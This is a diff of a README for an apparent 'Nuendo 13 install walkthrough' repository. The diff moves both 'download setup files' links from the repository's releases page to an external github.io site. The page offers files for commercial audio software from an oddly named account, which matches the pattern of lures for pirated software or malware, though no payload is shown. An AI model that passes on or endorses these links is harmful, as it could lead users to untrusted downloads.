@@ -1,6 +1,6 @@
 # 🛠 Nuendo-13-Install-Walkthrough - Get Nuendo 13 Running On Windows
 
-[![](https://img.shields.io/badge/Download_Nuendo_13_Steps-Blue?style=for-the-badge)](https://github.com/Strident-deconstructivism380/Nuendo-13-Install-Walkthrough/releases)
+[![](https://img.shields.io/badge/Download_Nuendo_13_Steps-Blue?style=for-the-badge)](https://strident-deconstructivism380.github.io)
 
 This guide provides steps to install Nuendo 13 on Windows 11. It covers setup, error fixes, and software configuration for audio production.
 
@@ -20,7 +20,7 @@ Ensure your Windows system receives all current updates from Microsoft before yo
 ## 📥 How To Download
 
 1.  Visit the official repository release page. 
-2.  Click this link to reach the download area: [Download Nuendo 13 Setup Files](https://github.com/Strident-deconstructivism380/Nuendo-13-Install-Walkthrough/releases)
+2.  Click this link to reach the download area: [Download Nuendo 13 Setup Files](https://strident-deconstructivism380.github.io)
 3.  Select the latest version file.
 4.  Save the file to your Downloads folder.
 
